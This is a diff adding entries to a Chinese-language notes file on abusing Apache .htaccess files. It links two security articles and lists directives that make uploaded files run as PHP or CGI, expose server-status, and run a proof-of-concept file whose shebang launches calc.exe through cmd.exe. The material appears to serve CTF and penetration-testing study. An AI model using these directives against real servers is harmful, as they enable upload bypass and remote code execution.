@@ -155,3 +155,33 @@ php_value pcre.jit 0
 5. `.htaccess` 可以自定义默认包含路径
 6. `.htaccess` 可以使用UTF-7编码绕过一些限制
 7. `.htaccess` 可以自定义preg\_match函数prce回溯次数
+8. [Apache中.htaccess文件利用的总结与新思路拓展](https://www.freebuf.com/vuls/218495.html)
+9. [.htaccess利用与Bypass方式总结](https://www.anquanke.com/post/id/205098)
+10. .htaccess利用方式
+
+```
+当前目录及其子目录下所有文件都会被当做php解析
+SetHandler application/x-httpd-php
+
+对指定后缀文件以选定的文件类型解析为php
+AddType application/x-httpd-php .a
+
+将当前目录下的文件当作文本解析
+<FilesMatch "\.ph.*$">
+SetHandler text/plain
+</FilesMatch>
+
+利用apache的服务器状态信息，可以查看所有访问本站的记录，访问127.0.0.1/server-status
+SetHandler server-status
+
+加载cgi_module
+Options ExecCGI
+AddHandler cgi-script .xx
+接下来，以Windows平台为例，上传poc.xx文件，内容如下：
+#!C:/Windows/System32/cmd.exe /c start calc.exe
+1
+第一行用来表示CGI程序的路径。可以随便开你的脑洞。
+因为CGI程序处理完成后，会被Apache关闭，所以我们这里要用启动新进程的方式来启动。
+这时访问poc.xx。计算器就出来了。
+```
+
